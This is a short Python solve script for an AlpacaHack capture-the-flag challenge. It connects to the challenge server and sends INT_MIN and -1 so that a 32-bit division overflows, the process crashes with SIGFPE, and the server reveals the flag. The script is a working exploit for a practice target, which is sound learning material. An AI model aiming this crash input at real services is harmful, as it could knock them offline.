#!/usr/bin/env python3
"""integer division - AlpacaHack Daily (misc/pwn).
chal only guards y==0. INT_MIN / -1 overflows a 32-bit int and the x86 idiv
raises #DE (SIGFPE), so the process exits nonzero and server.py prints the flag.
Usage: python3 -I solve.py HOST PORT"""
import re, socket, sys
H, P = sys.argv[1], int(sys.argv[2])
s = socket.create_connection((H, P), timeout=20); s.settimeout(8)
data=b""
try:
    s.sendall(b"-2147483648\n-1\n")
    while True:
        try: ch=s.recv(4096)
        except socket.timeout: break
        if not ch: break
        data+=ch
finally:
    s.close()
m=re.search(rb"Alpaca\{[^}]*\}", data)
print(m.group(0).decode() if m else data.decode(errors="replace"))
